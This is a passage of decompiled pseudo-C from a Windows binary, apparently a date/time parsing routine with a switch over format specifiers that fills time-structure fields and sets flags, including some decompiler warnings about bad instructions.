>> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                in_stack_00000038[4] = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 0x408;\n            }\n            break;\n        case 0x1e:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 99);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                *in_stack_00000048 = *in_stack_00000048 | 0x480;\n                in_stack_00000048[1] = uStack364;\n            }\n            break;\n        case 0x1f:\n            arg3 = &pcStack360;\n            fcn.14002b940(arg1_01, 0x14010b7ae, 0x14010b7b7, arg3);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            goto code_r0x000140063ff3;\n        case 0x23:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 0x17);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                in_stack_00000038[2] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 & 0xfe;\n            }\n            break;\n        case 0x24:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 0xc);\n            _auStack440 = CONCAT412(uStack380, CONCAT48(uStack384, CONCAT44(uStack388, uStack392)));\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                in_stack_00000038[2] = uStack364 % 0xc;\n                *in_stack_00000048 = *in_stack_00000048 | 1;\n            }\n            break;\n        case 0x28:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 0x3b);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                in_stack_00000038[1] = uStack364;\n            }\n            break;\n        case 0x2d:\n            arg3 = &pcStack360;\n            fcn.14002b940(arg1_01, 0x14010b7b7, 0x14010b7bd, arg3);\n            _auStack440 = CONCAT412(uStack380, CONCAT48(uStack384, CONCAT44(uStack388, uStack392)));\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            goto code_r0x000140063a75;\n        case 0x2e:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 0x3c);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                *in_stack_00000038 = uStack364;\n            }\n            break;\n        case 0x2f:\n            arg3 = &pcStack360;\n            fcn.14002b940(arg1_01, 0x14010b7bd, 0x14010b7c6, arg3);\n            auStack456_00 = CONCAT412(uStack396, CONCAT48(uStack400, CONCAT44(uStack404, uStack408)));\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            goto code_r0x000140063a75;\n        case 0x30:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 0x35);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                uVar39 = *in_stack_00000048;\n                in_stack_fffffffffffffe34 = uVar39;\n                in_stack_fffffffffffffe35 = uVar39 >> 8;\n                in_stack_fffffffffffffe36 = uVar39 >> 0x10;\n                in_stack_fffffffffffffe37 = uVar39 >> 0x18;\n                uVar24 = (uStack364 & 0x3f) << 0x10 | 0x20;\n                uVar39 = uVar39 & 0xffc0ffdf;\ncode_r0x00014006467b:\n                *in_stack_00000048 = uVar24 | uVar39;\n                piVar19 = piStack424;\n                piVar29 = piVar32;\n                uVar39 = uStack368;\n                uStack384 = uStack416;\n            }\n            break;\n        case 0x32:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 0x35);\n            _auStack440 = CONCAT412(uStack380, CONCAT48(uStack384, CONCAT44(uStack388, uStack392)));\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                uVar39 = *in_stack_00000048;\n                in_stack_fffffffffffffe34 = uVar39;\n                in_stack_fffffffffffffe35 = uVar39 >> 8;\n                in_stack_fffffffffffffe36 = uVar39 >> 0x10;\n                in_stack_fffffffffffffe37 = uVar39 >> 0x18;\n                uVar24 = (uStack364 & 0x3f) << 0x10 | 0x40;\n                uVar39 = uVar39 & 0xffc0ffbf;\n                goto code_r0x00014006467b;\n            }\n            break;\n        case 0x33:\n            auStack456_00 = CONCAT412(uStack396, CONCAT48(uStack400, CONCAT44(uStack404, uStack408)));\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            goto code_r0x000140063a75;\n        case 0x34:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 9999);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                in_stack_00000038[5] = uStack364 - 0x76c;\n                in_stack_fffffffffffffe34 = *(in_stack_00000048 + 1);\n                *(in_stack_00000048 + 1) = in_stack_fffffffffffffe34 & 0xf9 | 4;\n            }\n            break;\n        case 0x35:\n            uVar23 = fcn.140029e90(&uStack392);\n            if ((*(arg1_01[6] + uVar23 * 2) & 1) == 0) goto code_r0x0001400640ac;\n            puVar36 = &uStack368;\n            arg3 = &pcStack360;\n            in_stack_fffffffffffffde8 = 0xe;\n            arg_70h = &stack0xfffffffffffffe38;\n            auStack456_00 = CONCAT412(uStack396, CONCAT48(uStack400, CONCAT44(uStack404, uStack408)));\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            fcn.140062200(&piStack424, arg2, auStack440, arg_70h, arg3, *0x14010ff00, 0xe, in_stack_00000028, puVar36, \n                          in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, noname_11, arg_70h, pcVar38, iVar12, \n                          CONCAT17(in_stack_fffffffffffffe37, \n                                   CONCAT16(in_stack_fffffffffffffe36, \n                                            CONCAT15(in_stack_fffffffffffffe35, \n                                                     CONCAT14(in_stack_fffffffffffffe34, uVar39)))), \n                          CONCAT44(uStack404, uStack408));\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            cVar7 = fcn.140029dd0(&uStack392, &uStack408);\n            uVar39 = uStack368;\n            if ((cVar7 == '\\0') && ((uStack368 | pcStack360) == 0)) {\n                cVar7 = fcn.140029e90(&uStack392);\n                if (*(arg1_01 + 7) == '\\0') {\n                    cVar8 = fcn.14002b9d0(arg1_01, 0x2d);\n                }\n                else {\n                    cVar8 = *(arg1_01 + 0x66);\n                }\n                arg4 = arg_70h;\n                if (cVar7 != cVar8) {\n                    cVar7 = fcn.140029e90(&uStack392);\n                    if (*(arg1_01 + 7) == '\\0') {\n                        cVar8 = fcn.14002b9d0(arg1_01, 0x2b);\n                    }\n                    else {\n                        cVar8 = *(arg1_01 + 100);\n                    }\n                    arg4 = arg_70h;\n                    if (cVar7 != cVar8) goto code_r0x0001400638ec;\n                }\n                uVar37 = in_stack_fffffffffffffde8 >> 0x20;\n                auStack440 = CONCAT44(uStack388, uStack392);\n                _auStack440 = CONCAT48(uStack384, auStack440);\n                _auStack440 = CONCAT412(uStack380, _auStack440);\n                arg_70h = arg4;\n                fcn.140061c20(&piStack424, arg2, auStack440, arg4);\n                in_stack_fffffffffffffde8 = CONCAT44(uVar37, 0x3b);\n                uStack384 = uStack416;\n                uStack392 = SUB84(piStack424, 0);\n                uStack388 = piStack424 >> 0x20;\n                auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n                auStack456_00 = CONCAT412(uStack396, auStack456);\n                _auStack440 = CONCAT48(uStack416, piStack424);\n                _auStack440 = CONCAT412(uStack380, _auStack440);\n                fcn.140061c20(&piStack424, arg2, auStack440, arg4);\n                uStack384 = uStack416;\n                uStack392 = SUB84(piStack424, 0);\n                uStack388 = piStack424 >> 0x20;\n                in_stack_fffffffffffffe00 = puVar36;\n                uVar39 = uStack368;\n            }\n            goto code_r0x0001400638ec;\n        case 0x3e:\n            _auStack440 = CONCAT412(uStack380, CONCAT48(uStack384, CONCAT44(uStack388, uStack392)));\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\ncode_r0x000140063ff3:\n            in_stack_fffffffffffffde8 = in_stack_00000038;\n            fcn.140062e10(&piStack424, arg2);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 4;\n            }\n            break;\n        case 0x3f:\n        case 0x40:\n            uVar23 = fcn.140029e90(&uStack392);\n            uVar37 = in_stack_fffffffffffffde8 >> 0x20;\n            if ((*(arg1_01[6] + uVar23 * 2) & 0x20) != 0) {\n                fcn.14009b630(CONCAT44(uStack388, uStack392));\n                uStack384 = 0xffffffff;\n            }\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 0x1f);\n            auStack456_00 = CONCAT412(uStack396, CONCAT48(uStack400, CONCAT44(uStack404, uStack408)));\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                in_stack_00000038[3] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 0x410;\n            }\n            break;\n        case 0x45:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 0x16e);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                in_stack_00000038[7] = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 4;\n            }\n            break;\n        case 0x48:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 0xc);\n            auStack456_00 = CONCAT412(uStack396, CONCAT48(uStack400, CONCAT44(uStack404, uStack408)));\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                in_stack_00000038[4] = uStack364 - 1;\n                *in_stack_00000048 = *in_stack_00000048 | 8;\n            }\n            break;\n        case 0x49:\n        case 0x4f:\n            while ((cVar7 = fcn.140029dd0(&uStack392, &uStack408),  cVar7 == '\\0' &&\n                   (uVar23 = fcn.140029e90(&uStack392),  (*(arg1_01[6] + uVar23 * 2) & 0x20) != 0))) {\n                fcn.14009b630(CONCAT44(uStack388, uStack392));\n                uStack384 = 0xffffffff;\n            }\ncode_r0x0001400638ec:\n            piVar30 = uStack384;\n            arg_70h = arg_70h & 0xffffffff00000000 | uStack400;\n            piVar19 = CONCAT44(uStack388, uStack392);\n            piVar29 = piVar32;\n            break;\n        case 0x4b:\n            pcStack360 = *(*(iVar12 + 0x10) + 0x40);\n            pcStack352 = *(*(iVar12 + 0x10) + 0x48);\n            if ((*pcStack360 == '\\0') || (*pcStack352 == '\\0')) {\n                piVar19 = CONCAT44(uStack388, uStack392);\n                piVar29 = piVar32;\n            }\n            else {\n                in_stack_fffffffffffffde8 = 0x2;\n                auStack440 = CONCAT44(uStack388, uStack392);\n                _auStack440 = CONCAT48(uStack384, auStack440);\n                _auStack440 = CONCAT412(uStack380, _auStack440);\n                auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n                auStack456_00 = CONCAT412(uStack396, auStack456);\n                fcn.140062200(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38, &uStack364, &pcStack360, 2, \n                              in_stack_00000028, &uStack368, in_stack_fffffffffffffe00, in_stack_fffffffffffffe08, \n                              noname_11, arg_70h, pcVar38, iVar12, \n                              CONCAT17(in_stack_fffffffffffffe37, \n                                       CONCAT16(in_stack_fffffffffffffe36, \n                                                CONCAT15(in_stack_fffffffffffffe35, \n                                                         CONCAT14(in_stack_fffffffffffffe34, uVar39)))), \n                              CONCAT44(uStack404, uStack408));\n                uStack384 = uStack416;\n                piVar30 = uStack416;\n                uStack392 = SUB84(piStack424, 0);\n                uStack388 = piStack424 >> 0x20;\n                piVar19 = piStack424;\n                piVar29 = piVar32;\n                uVar39 = uStack368;\n                if ((uStack368 == 0) && (uStack364 != 0)) {\n                    piVar30 = uStack416;\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 1;\n                }\n            }\n            break;\n        case 0x4d:\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            goto code_r0x000140063a75;\n        case 0x52:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 6);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                piVar30 = uStack416;\n                in_stack_00000038[6] = uStack364;\n                *in_stack_00000048 = *in_stack_00000048 | 2;\n            }\n            break;\n        case 0x53:\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\ncode_r0x000140063a75:\n            in_stack_fffffffffffffde8 = in_stack_00000038;\n            fcn.140062e10(&piStack424, arg2);\n            uStack384 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            piVar30 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            break;\n        case 0x54:\n            in_stack_fffffffffffffe00 = &uStack368;\n            in_stack_fffffffffffffde8 = CONCAT44(uVar37, 99);\n            auStack440 = CONCAT44(uStack388, uStack392);\n            _auStack440 = CONCAT48(uStack384, auStack440);\n            _auStack440 = CONCAT412(uStack380, _auStack440);\n            auStack456 = CONCAT48(uStack400, CONCAT44(uStack404, uStack408));\n            auStack456_00 = CONCAT412(uStack396, auStack456);\n            fcn.140061c20(&piStack424, arg2, auStack440, &stack0xfffffffffffffe38);\n            piVar30 = uStack416;\n            uStack392 = SUB84(piStack424, 0);\n            uStack388 = piStack424 >> 0x20;\n            uStack384 = uStack416;\n            piVar19 = piStack424;\n            piVar29 = piVar32;\n            uVar39 = uStack368;\n            if (uStack368 == 0) {\n                *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) | 6;\n                cVar7 = fcn.140029dd0(&uStack392, &uStack408);\n                uVar24 = uStack364;\n                uVar37 = arg_70h >> 0x20;\n                if (cVar7 == '\\0') {\n                    cVar7 = fcn.140029e90(&uStack392);\n                    cVar7 = fcn.14002ba20(arg1_01, cVar7, 0x2a);\n                    if (9 < cVar7 - 0x30U) goto code_r0x000140064ab7;\n                    fcn.14009b630(CONCAT44(uStack388, uStack392));\n                    uStack384 = 0xffffffff;\n                    uVar24 = (cVar7 - 0x30U) + uVar24 * 10;\n                    uStack364 = uVar24;\n                    cVar7 = fcn.140029dd0(&uStack392, &uStack408);\n                    if (cVar7 == '\\0') {\n                        cVar7 = fcn.140029e90(&uStack392);\n                        cVar7 = fcn.14002ba20(arg1_01, cVar7, 0x2a);\n                        if (cVar7 - 0x30U < 10) {\n                            fcn.14009b630(CONCAT44(uStack388, uStack392));\n                            uStack384 = 0xffffffff;\n                            uVar24 = uVar24 * 10 + (cVar7 - 0x30U);\n                        }\n                    }\n                    arg3 = uVar24 - 0x76c;\n                    *(in_stack_00000048 + 1) = *(in_stack_00000048 + 1) & 0xfd;\n                }\n                else {\ncode_r0x000140064ab7:\n                    arg3 = uVar24;\n                    if (uVar24 < 0x45) {\n                        arg3 = uVar24 + 100;\n                    }\n                }\n                piVar30 = uStack384;\n                in_stack_00000038[5] = arg3;\n                arg_70h = CONCAT44(uVar37, uStack400);\n                piVar19 = CONCAT44(uStack388, uStack392);\n            }\n            break;\n        case 0x55:\n            *0x14010b7c7 = *0x14010b7c7 + -1 + (0xfffffffebfef4837 < uVar14);\n            *(uVar14 + 0x14010b753) = *(uVar14 + 0x14010b753) + -1;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x56:\n            *auStack280._0_8_ = *auStack280._0_8_ + cVar7;\n            goto code_r0x00014006c6d5;\n        case 0x57:\n            goto code_r0x00014006c683;\n        case 0x58:\n            _auStack440 = auVar35;\n            piStack312 = piVar21;\n            fcn.1400b97f0(piVar19);\n            iVar12 = fcn.14002c080(0x140108440);\n            ppuVar1 = *(*(auStack280._0_8_ + 0xd0) + 0x18) + iVar12 * 8;\n            puVar28 = *ppuVar1;\n            if (puVar28 == NULL) {\n                puVar20 = fcn.1400bc710(0x70);\n                *(puVar20 + 1) = 0;\n                *puVar20 = 0x140118870;\n                puVar20[2] = 0;\n                puVar20[3] = 0;\n                *(puVar20 + 4) = 0;\n                *(puVar20 + 0x21) = 0;\n                puVar20[5] = 0;\n                puVar20[6] = 0;\n                puVar20[7] = 0;\n                puVar20[8] = 0;\n                puVar20[9] = 0;\n                puVar20[10] = 0;\n                *(puVar20 + 0xb) = 0;\n                *(puVar20 + 0x5c) = 0;\n                *(puVar20 + 0x6f) = 0;\n                fcn.1400a0590(puVar20, piVar19);\n                fcn.1400a38f0(*(auStack280._0_8_ + 0xd0), puVar20, iVar12);\n                puVar28 = *ppuVar1;\n            }\ncode_r0x00014006c683:\n            in_stack_fffffffffffffde8 = &uStack400;\n            uVar17 = fcn.14007b890(0, 0);\n            uStack408 = uVar17;\n            uStack404 = uVar17 >> 0x20;\n            if (puVar28[0x20] != 0) {\n                fcn.14007d790(&uStack408, 0x20);\n            }\ncode_r0x00014006c6d5:\n            uVar17 = fcn.14007b890(0, 0);\n            uStack400 = uVar17;\n            uStack396 = uVar17 >> 0x20;\n            fcn.14007d790(in_stack_fffffffffffffde8, 0x20);\n            cVar8 = '\\0';\n            iVar12 = 0;\n            uStack412 = *(puVar28 + 0x60);\n            cVar7 = '\\0';\n            cVar40 = '\\0';\n            do {\n                if (*(&uStack412 + iVar12) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014006c775. Too many branches\n    // WARNING: Treating indirect jump as call\n                    piVar19 = (*(*(*(&uStack412 + iVar12) * 4 + 0x14010b91c) + 0x14010b91c))();\n                    return piVar19;\n                }\n                iVar10 = iVar12;\n                iVar12 = iVar12 + 1;\n            } while (iVar10 + 1 < 4);\n            puVar36 = in_stack_fffffffffffffde8;\n            if (1 < *(CONCAT44(uStack396, uStack400) + -0x18)) {\n                cVar40 = '\\0';\n                cVar8 = '\\0';\n                cVar7 = '\\0';\n                uVar15 = fcn.140024dd0(in_stack_fffffffffffffde8, 0x30, 0);\n                if (uVar15 != 0) {\n                    uVar14 = *(CONCAT44(uStack396, uStack400) + -0x18);\n                    if (uVar15 == 0xffffffffffffffff) {\n                        uVar15 = uVar14 - 1;\n                    }\n                    if (uVar15 <= uVar14) {\n                        uVar14 = uVar15;\n                    }\n                    fcn.14007d8a0(in_stack_fffffffffffffde8, 0, uVar14, 0);\n                }\n            }\n            if (cVar40 != '\\0') {\n                pcVar18 = CONCAT44(uStack396, uStack400);\n                if (-1 < *(pcVar18 + -8)) {\n                    fcn.14007b820(puVar36);\n                    pcVar18 = CONCAT44(uStack396, uStack400);\n                }\n                if (*pcVar18 != '0') {\n                    if (-1 < *(pcVar18 + -8)) {\n                        fcn.14007b820(puVar36);\n                    }\n                    fcn.14007bd00(puVar36, 0, 0, 1);\n                    *(CONCAT44(uStack396, uStack400) + -8) = 0xffffffff;\n                }\n            }\n            if (*(CONCAT44(uStack404, uStack408) + -0x18) != 0) {\n                cVar40 = '\\0';\n                if (cVar8 != '\\0') {\n                    cVar40 = cVar7;\n                }\n                fcn.14007da40(&uStack408, cVar40);\n                cVar7 = fcn.1400b76a0(*(puVar28 + 0x10), *(puVar28 + 0x18), &uStack408);\n                if (cVar7 == '\\0') {\n                    *auStack280._8_8_ = *auStack280._8_8_ | 4;\n                }\n            }\n            if ((cVar8 == '\\0') || (*(puVar28 + 0x58) == 0)) {\n                fcn.14007c220(CONCAT44(uStack260, uStack264), puVar36);\n            }\n            else {\n                *auStack280._8_8_ = *auStack280._8_8_ | 4;\n            }\n            cVar7 = fcn.140029dd0(auStack440, &stack0xfffffffffffffe38);\n            if (cVar7 != '\\0') {\n                *auStack280._8_8_ = *auStack280._8_8_ | 2;\n            }\n            *piStack312 = auStack440._0_4_;\n            *(piStack312 + 4) = auStack440._4_4_;\n            *(piStack312 + 1) = uStack432;\n            *(piStack312 + 0xc) = uStack428;\n            fcn.14007bf20(CONCAT44(uStack396, uStack400) + -0x18);\n            fcn.14007bf20(CONCAT44(uStack404, uStack408) + -0x18);\n            return piStack312;\n        case 0x59:\n            *auStack280._0_8_ = *auStack280._0_8_;\n            *(uVar14 + 0x14010b755) = *(uVar14 + 0x14010b755) + uVar22;\n            *(uVar14 + 0x14010b751) = *(uVar14 + 0x14010b751) + uVar22;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x5a:\n            cVar7 = auStack280._0_8_ >> 8;\n            do {\n                piVar32 = piVar30;\n                if ((cVar7 != '\\0') && (piVar32 = NULL,  piVar29[3] <= piVar29[2])) {\n                    iVar10 = (**(*piVar29 + 0x48))(piVar29);\n                    piVar32 = iVar10 == -1;\n                    if (iVar10 == -1) {\n                        _auStack440 = _auStack440 & 0xffffffffffffffff;\n                    }\n                }\n                do {\n                    uVar23 = piVar19;\n                    piVar19 = SUB168(auStack456_00, 0);\n                    bVar33 = iStack448 == -1;\n                    if (((piVar19 != NULL) && (bVar33)) && (bVar33 = false,  piVar19[3] <= piVar19[2])) {\n                        iVar10 = (**(*piVar19 + 0x48))();\n                        bVar33 = iVar10 == -1;\n                        if (bVar33) {\n                            auStack456_00 = auStack456_00 & 0xffffffffffffffff;\n                        }\n                    }\n                    piVar25 = auStackY584;\n                    if (piVar32 == bVar33) goto code_r0x00014006b7e0;\n                    if ((auStack440 == NULL) || (piVar30 == '\\0')) {\ncode_r0x00014006bda2:\n                        piVar25 = auStackY584;\n                        if ((*(noname_11[6] + uVar23 * 2) & 0x20) == 0) goto code_r0x00014006b7e0;\n                        puVar13 = auStack440[2];\n                        if (puVar13 < auStack440[3]) goto code_r0x00014006bdcf;\n                        (**(*auStack440 + 0x50))(auStack440);\n                        piVar29 = auStack440;\n                    }\n                    else {\n                        puVar13 = auStack440[2];\n                        if (auStack440[3] <= puVar13) {\n                            iVar10 = (**(*auStack440 + 0x48))(auStack440);\n                            uVar23 = iVar10;\n                            if (iVar10 == -1) {\n                                _auStack440 = _auStack440 & 